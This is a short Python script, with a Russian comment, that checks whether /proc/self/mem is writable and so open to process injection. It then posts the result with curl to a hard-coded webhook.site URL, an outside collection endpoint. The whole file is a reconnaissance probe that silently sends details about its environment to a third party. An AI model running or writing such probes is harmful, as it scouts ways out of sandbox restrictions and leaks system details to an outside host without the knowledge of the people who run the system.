import socket
import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def check_mem_injection():
    try:
        # Пытаемся открыть свою же память
        mem_file = open("/proc/self/mem", "wb")
        report = "[+] Possible: /proc/self/mem is writable. Potential for process injection."
        mem_file.close()
    except Exception as e:
        report = f"[-] /proc/self/mem injection blocked: {e}"
    
    subprocess.run(['curl', '-s', '-X', 'POST', '-d', report, WEBHOOK_URL])

if __name__ == "__main__":
    check_mem_injection()
